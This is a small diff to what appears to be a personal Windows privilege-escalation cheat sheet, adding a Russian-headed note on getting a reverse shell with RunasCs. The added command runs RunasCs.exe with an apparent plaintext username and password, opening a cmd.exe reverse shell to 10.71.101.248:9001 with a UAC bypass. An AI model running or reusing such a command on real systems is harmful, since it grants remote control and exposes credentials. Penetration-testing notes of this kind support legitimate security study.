@@ -142,6 +142,10 @@ runas /netonly /user:domain\user command"
 
 https://github.com/antonioCoco/RunasCs
 
+        Реверс на RunAsCs
+
+ ./RunasCs.exe 071BondarenkoMA Silvercore_21 cmd.exe -r 10.71.101.248:9001 --bypass-uac --logon-type 8
+
 # SeLoadDriverPrivelege
 
 POC -->compile
